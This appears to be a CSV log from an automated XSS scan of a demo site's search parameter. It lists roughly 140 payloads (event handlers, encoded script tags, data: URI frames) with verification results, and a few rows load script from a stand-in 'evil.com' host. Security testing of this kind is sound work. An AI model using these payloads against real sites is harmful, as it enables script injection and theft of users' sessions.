Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:58:51.029,2026-01-10 16:58:51.141,0.112,https://demo-knsl.onrender.com/search,GET,q,<a href=vbscript:msgbox(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.075,2026-01-10 16:58:51.193,0.118,https://demo-knsl.onrender.com/search,GET,q,"<input pattern="".*"" title=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.074,2026-01-10 16:58:51.195,0.121,https://demo-knsl.onrender.com/search,GET,q,<a href=about:blank>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.100,2026-01-10 16:58:51.196,0.095,https://demo-knsl.onrender.com/search,GET,q,"<div title=""test"" onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.104,2026-01-10 16:58:51.218,0.114,https://demo-knsl.onrender.com/search,GET,q,"<img alt=""test"" src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.118,2026-01-10 16:58:51.218,0.100,https://demo-knsl.onrender.com/search,GET,q,<blockquote cite=javascript:alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.077,2026-01-10 16:58:51.224,0.147,https://demo-knsl.onrender.com/search,GET,q,"<input placeholder=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.141,2026-01-10 16:58:51.260,0.119,https://demo-knsl.onrender.com/search,GET,q,<img longdesc=javascript:alert(1) src=x>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.195,2026-01-10 16:58:51.313,0.118,https://demo-knsl.onrender.com/search,GET,q,<img ismap src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.196,2026-01-10 16:58:51.320,0.125,https://demo-knsl.onrender.com/search,GET,q,<input dirname=test onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.193,2026-01-10 16:58:51.320,0.127,https://demo-knsl.onrender.com/search,GET,q,<img usemap=#x src=x><map name=x><area onclick=alert(1)></map>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.224,2026-01-10 16:58:51.336,0.112,https://demo-knsl.onrender.com/search,GET,q,<svg><script>&#97;lert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.218,2026-01-10 16:58:51.346,0.127,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert&#x28;1&#x29;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.218,2026-01-10 16:58:51.346,0.127,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert&#40;1&#41;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.260,2026-01-10 16:58:51.394,0.134,https://demo-knsl.onrender.com/search,GET,q,"<div style=""xss:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.313,2026-01-10 16:58:51.421,0.108,https://demo-knsl.onrender.com/search,GET,q,"<div style=""background:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.320,2026-01-10 16:58:51.424,0.103,https://demo-knsl.onrender.com/search,GET,q,<div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.320,2026-01-10 16:58:51.435,0.115,https://demo-knsl.onrender.com/search,GET,q,"<script type=importmap>{""imports"":{""x"":""javascript:alert(1)""}}</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.336,2026-01-10 16:58:51.440,0.104,https://demo-knsl.onrender.com/search,GET,q,"<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.346,2026-01-10 16:58:51.456,0.111,https://demo-knsl.onrender.com/search,GET,q,"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.346,2026-01-10 16:58:51.472,0.126,https://demo-knsl.onrender.com/search,GET,q,"<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.394,2026-01-10 16:58:51.508,0.115,https://demo-knsl.onrender.com/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.421,2026-01-10 16:58:51.522,0.101,https://demo-knsl.onrender.com/search,GET,q,<isindex type=submit value=X onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.424,2026-01-10 16:58:51.522,0.098,https://demo-knsl.onrender.com/search,GET,q,<bgsound src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:50.800,2026-01-10 16:58:51.524,0.724,https://demo-knsl.onrender.com/search,GET,q,<a name=x onclick=alert(1)>X</a>,RAW_REFLECTION,No,,High
2026-01-10 16:58:51.435,2026-01-10 16:58:51.531,0.095,https://demo-knsl.onrender.com/search,GET,q,<applet code=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.440,2026-01-10 16:58:51.541,0.101,https://demo-knsl.onrender.com/search,GET,q,<script>al\u0065rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.472,2026-01-10 16:58:51.610,0.139,https://demo-knsl.onrender.com/search,GET,q,<script>eval('al'+'ert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:50.878,2026-01-10 16:58:51.612,0.734,https://demo-knsl.onrender.com/search,GET,q,"'"">><marquee onstart=prompt(1)>",RAW_REFLECTION,No,,High
2026-01-10 16:58:51.508,2026-01-10 16:58:51.625,0.117,https://demo-knsl.onrender.com/search,GET,q,<script>eval('al\x65rt(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.522,2026-01-10 16:58:51.662,0.140,https://demo-knsl.onrender.com/search,GET,q,<script>[1].find(alert)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.612,2026-01-10 16:58:51.665,0.053,https://demo-knsl.onrender.com/search,GET,q,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;,NO_REFLECTION,No,,Info
2026-01-10 16:58:51.524,2026-01-10 16:58:51.667,0.143,https://demo-knsl.onrender.com/search,GET,q,<script>top[/al/.source+/ert/.source](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.522,2026-01-10 16:58:51.674,0.151,https://demo-knsl.onrender.com/search,GET,q,<script>top['al'+'ert'](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.541,2026-01-10 16:58:51.701,0.160,https://demo-knsl.onrender.com/search,GET,q,&lt;script&gt;alert(1)&lt;/script&gt;,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.610,2026-01-10 16:58:51.721,0.111,https://demo-knsl.onrender.com/search,GET,q,&#60;script&#62;alert(1)&#60;/script&#62;,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.625,2026-01-10 16:58:51.733,0.108,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:50.968,2026-01-10 16:58:51.736,0.767,https://demo-knsl.onrender.com/search,GET,q,<form action=javascript:alert(1)><button>X</button></form>,RAW_REFLECTION,No,,High
2026-01-10 16:58:51.662,2026-01-10 16:58:51.781,0.119,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.665,2026-01-10 16:58:51.783,0.118,https://demo-knsl.onrender.com/search,GET,q,<script/src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.674,2026-01-10 16:58:51.790,0.116,https://demo-knsl.onrender.com/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.531,2026-01-10 16:58:51.798,0.268,https://demo-knsl.onrender.com/search,GET,q,<script>top[8680439..toString(30)](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.701,2026-01-10 16:58:51.801,0.100,https://demo-knsl.onrender.com/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.721,2026-01-10 16:58:51.829,0.108,https://demo-knsl.onrender.com/search,GET,q,<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.736,2026-01-10 16:58:51.841,0.106,https://demo-knsl.onrender.com/search,GET,q,<listing>&lt;img src=x onerror=alert(1)&gt;</listing>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.733,2026-01-10 16:58:51.841,0.108,https://demo-knsl.onrender.com/search,GET,q,<noscript><iframe></noscript><img src=x onerror=alert(1)></iframe></noscript>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.783,2026-01-10 16:58:51.890,0.108,https://demo-knsl.onrender.com/search,GET,q,<xmp>&lt;img src=x onerror=alert(1)&gt;</xmp>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.781,2026-01-10 16:58:51.893,0.112,https://demo-knsl.onrender.com/search,GET,q,<textarea>&lt;img src=x onerror=alert(1)&gt;</textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.798,2026-01-10 16:58:51.896,0.098,https://demo-knsl.onrender.com/search,GET,q,<svg><foreignObject><script>alert(1)</script></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.801,2026-01-10 16:58:51.903,0.101,https://demo-knsl.onrender.com/search,GET,q,<template><slot onfocus=alert(1) autofocus></slot></template>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.829,2026-01-10 16:58:51.935,0.106,https://demo-knsl.onrender.com/search,GET,q,<input type=text onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.841,2026-01-10 16:58:51.955,0.113,https://demo-knsl.onrender.com/search,GET,q,<input type=password onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.841,2026-01-10 16:58:51.963,0.122,https://demo-knsl.onrender.com/search,GET,q,<input type=email onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.893,2026-01-10 16:58:52.017,0.124,https://demo-knsl.onrender.com/search,GET,q,<input type=search onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.890,2026-01-10 16:58:52.019,0.128,https://demo-knsl.onrender.com/search,GET,q,<input type=number onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.896,2026-01-10 16:58:52.021,0.124,https://demo-knsl.onrender.com/search,GET,q,<input type=tel onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.903,2026-01-10 16:58:52.023,0.120,https://demo-knsl.onrender.com/search,GET,q,<input type=url onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.935,2026-01-10 16:58:52.043,0.107,https://demo-knsl.onrender.com/search,GET,q,<input type=date onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.017,2026-01-10 16:58:52.088,0.070,https://demo-knsl.onrender.com/search,GET,q,<input type=month onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-10 16:58:51.963,2026-01-10 16:58:52.089,0.127,https://demo-knsl.onrender.com/search,GET,q,<input type=datetime-local onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.955,2026-01-10 16:58:52.089,0.135,https://demo-knsl.onrender.com/search,GET,q,<input type=time onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.043,2026-01-10 16:58:52.098,0.055,https://demo-knsl.onrender.com/search,GET,q,<input type=button onclick=alert(1) value=X>,NO_REFLECTION,No,,Info
2026-01-10 16:58:52.023,2026-01-10 16:58:52.134,0.112,https://demo-knsl.onrender.com/search,GET,q,<input type=range onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.021,2026-01-10 16:58:52.134,0.114,https://demo-knsl.onrender.com/search,GET,q,<input type=color onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.019,2026-01-10 16:58:52.139,0.120,https://demo-knsl.onrender.com/search,GET,q,<input type=week onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.790,2026-01-10 16:58:52.139,0.349,https://demo-knsl.onrender.com/search,GET,q,<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.098,2026-01-10 16:58:52.176,0.079,https://demo-knsl.onrender.com/search,GET,q,<input list=x><datalist id=x><option onclick=alert(1)>X</option></datalist>,NO_REFLECTION,No,,Info
2026-01-10 16:58:52.088,2026-01-10 16:58:52.204,0.117,https://demo-knsl.onrender.com/search,GET,q,<input type=reset onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.089,2026-01-10 16:58:52.204,0.115,https://demo-knsl.onrender.com/search,GET,q,<datalist onmouseover=alert(1)>X</datalist>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.089,2026-01-10 16:58:52.205,0.115,https://demo-knsl.onrender.com/search,GET,q,<input type=submit onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.456,2026-01-10 16:58:52.219,0.762,https://demo-knsl.onrender.com/search,GET,q,<script>al\x65rt(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 16:58:52.139,2026-01-10 16:58:52.257,0.118,https://demo-knsl.onrender.com/search,GET,q,<img srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.134,2026-01-10 16:58:52.257,0.122,https://demo-knsl.onrender.com/search,GET,q,<keygen onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.204,2026-01-10 16:58:52.269,0.064,https://demo-knsl.onrender.com/search,GET,q,<img crossorigin=anonymous src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 16:58:52.205,2026-01-10 16:58:52.269,0.064,https://demo-knsl.onrender.com/search,GET,q,<script crossorigin=anonymous src=x onerror=alert(1)></script>,NO_REFLECTION,No,,Info
2026-01-10 16:58:52.176,2026-01-10 16:58:52.316,0.140,https://demo-knsl.onrender.com/search,GET,q,<source srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.204,2026-01-10 16:58:52.318,0.114,https://demo-knsl.onrender.com/search,GET,q,"<img sizes=""100vw"" srcset=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.219,2026-01-10 16:58:52.323,0.105,https://demo-knsl.onrender.com/search,GET,q,"<script integrity=""sha384-x"" src=x onerror=alert(1)></script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.257,2026-01-10 16:58:52.384,0.128,https://demo-knsl.onrender.com/search,GET,q,<img loading=lazy src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.269,2026-01-10 16:58:52.384,0.115,https://demo-knsl.onrender.com/search,GET,q,<img decoding=async src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.269,2026-01-10 16:58:52.389,0.120,https://demo-knsl.onrender.com/search,GET,q,<img importance=high src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.257,2026-01-10 16:58:52.403,0.147,https://demo-knsl.onrender.com/search,GET,q,<img referrerpolicy=no-referrer src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.318,2026-01-10 16:58:52.425,0.107,https://demo-knsl.onrender.com/search,GET,q,<img src=x onwaiting=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.323,2026-01-10 16:58:52.426,0.103,https://demo-knsl.onrender.com/search,GET,q,<img src=x onseeking=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.316,2026-01-10 16:58:52.449,0.133,https://demo-knsl.onrender.com/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.384,2026-01-10 16:58:52.491,0.106,https://demo-knsl.onrender.com/search,GET,q,<img src=x onseeked=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.389,2026-01-10 16:58:52.491,0.102,https://demo-knsl.onrender.com/search,GET,q,<img src=x onplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.384,2026-01-10 16:58:52.494,0.109,https://demo-knsl.onrender.com/search,GET,q,<img src=x onplaying=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.403,2026-01-10 16:58:52.513,0.109,https://demo-knsl.onrender.com/search,GET,q,<img src=x onpause=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.426,2026-01-10 16:58:52.540,0.114,https://demo-knsl.onrender.com/search,GET,q,<img src=x onloadedmetadata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.425,2026-01-10 16:58:52.542,0.117,https://demo-knsl.onrender.com/search,GET,q,<img src=x onloadstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.449,2026-01-10 16:58:52.552,0.103,https://demo-knsl.onrender.com/search,GET,q,<img src=x onloadeddata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.494,2026-01-10 16:58:52.600,0.106,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncanplaythrough=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.491,2026-01-10 16:58:52.602,0.112,https://demo-knsl.onrender.com/search,GET,q,<img src=x onended=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.491,2026-01-10 16:58:52.603,0.112,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondurationchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.513,2026-01-10 16:58:52.625,0.112,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncanplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.540,2026-01-10 16:58:52.679,0.139,https://demo-knsl.onrender.com/search,GET,q,"<iframe sandbox=allow-scripts src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.542,2026-01-10 16:58:52.679,0.137,https://demo-knsl.onrender.com/search,GET,q,"<iframe sandbox=allow-scripts srcdoc=""<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.552,2026-01-10 16:58:52.683,0.131,https://demo-knsl.onrender.com/search,GET,q,<root><![CDATA[<script>alert(1)</script>]]></root>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.602,2026-01-10 16:58:52.718,0.116,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.location)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.603,2026-01-10 16:58:52.718,0.115,https://demo-knsl.onrender.com/search,GET,q,<script>alert(navigator.userAgent)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.600,2026-01-10 16:58:52.722,0.122,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.625,2026-01-10 16:58:52.726,0.101,https://demo-knsl.onrender.com/search,GET,q,<script>alert(localStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.726,2026-01-10 16:58:52.795,0.069,https://demo-knsl.onrender.com/search,GET,q,<acronym onmouseover=alert(1)>X</acronym>,NO_REFLECTION,No,,Info
2026-01-10 16:58:52.679,2026-01-10 16:58:52.797,0.118,https://demo-knsl.onrender.com/search,GET,q,<script>alert(sessionStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.679,2026-01-10 16:58:52.798,0.118,https://demo-knsl.onrender.com/search,GET,q,<script>'alert\u0028document.domain\u0029'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.683,2026-01-10 16:58:52.811,0.128,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.name)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.718,2026-01-10 16:58:52.819,0.101,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.safari)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.722,2026-01-10 16:58:52.819,0.098,https://demo-knsl.onrender.com/search,GET,q,<blink onmouseover=alert(1)>X</blink>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.718,2026-01-10 16:58:52.834,0.116,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.chrome)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.811,2026-01-10 16:58:52.871,0.060,https://demo-knsl.onrender.com/search,GET,q,<font onmouseover=alert(1)>X</font>,NO_REFLECTION,No,,Info
2026-01-10 16:58:52.797,2026-01-10 16:58:52.899,0.102,https://demo-knsl.onrender.com/search,GET,q,<center onmouseover=alert(1)>X</center>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.795,2026-01-10 16:58:52.901,0.106,https://demo-knsl.onrender.com/search,GET,q,<big onmouseover=alert(1)>X</big>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.139,2026-01-10 16:58:52.901,0.763,https://demo-knsl.onrender.com/search,GET,q,<custom-element onclick=alert(1)>X</custom-element>,RAW_REFLECTION,No,,High
2026-01-10 16:58:52.798,2026-01-10 16:58:52.908,0.110,https://demo-knsl.onrender.com/search,GET,q,<dir onmouseover=alert(1)>X</dir>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.134,2026-01-10 16:58:52.912,0.778,https://demo-knsl.onrender.com/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 16:58:52.819,2026-01-10 16:58:52.930,0.111,https://demo-knsl.onrender.com/search,GET,q,<frameset onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.834,2026-01-10 16:58:52.948,0.114,https://demo-knsl.onrender.com/search,GET,q,<noframes onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.899,2026-01-10 16:58:53.003,0.104,https://demo-knsl.onrender.com/search,GET,q,<tt onmouseover=alert(1)>X</tt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.901,2026-01-10 16:58:53.008,0.107,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1);alert(2);alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.912,2026-01-10 16:58:53.008,0.096,https://demo-knsl.onrender.com/search,GET,q,<script>if(1){alert(1)}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.901,2026-01-10 16:58:53.017,0.116,https://demo-knsl.onrender.com/search,GET,q,<script>for(i=0;i<3;i++){alert(i)}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.908,2026-01-10 16:58:53.019,0.111,https://demo-knsl.onrender.com/search,GET,q,<script>while(1){alert(1);break}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.930,2026-01-10 16:58:53.026,0.095,https://demo-knsl.onrender.com/search,GET,q,<script>try{alert(1)}catch(e){}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:52.948,2026-01-10 16:58:53.046,0.098,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)||alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:53.003,2026-01-10 16:58:53.103,0.101,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)&&alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:53.017,2026-01-10 16:58:53.116,0.099,https://demo-knsl.onrender.com/search,GET,q,"<script>alert({x:1,y:2})</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:53.008,2026-01-10 16:58:53.116,0.108,https://demo-knsl.onrender.com/search,GET,q,"<script>alert([1,2,3])</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:53.019,2026-01-10 16:58:53.120,0.101,https://demo-knsl.onrender.com/search,GET,q,<script>alert(function(){return 1}())</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:53.008,2026-01-10 16:58:53.120,0.112,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)?alert(2):alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:53.026,2026-01-10 16:58:53.129,0.103,https://demo-knsl.onrender.com/search,GET,q,<script>alert((()=>1)())</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:53.046,2026-01-10 16:58:53.151,0.105,https://demo-knsl.onrender.com/search,GET,q,<script>alert(class{constructor(){return 1}})</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:51.667,2026-01-10 16:58:53.309,1.643,https://demo-knsl.onrender.com/search,GET,q,<script	src=//evil.com></script>,RAW_REFLECTION,No,,High
2026-01-10 16:58:52.819,2026-01-10 16:58:53.559,0.740,https://demo-knsl.onrender.com/search,GET,q,<frame onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:58:52.871,2026-01-10 16:58:53.593,0.722,https://demo-knsl.onrender.com/search,GET,q,<strike onmouseover=alert(1)>X</strike>,RAW_REFLECTION,No,,High
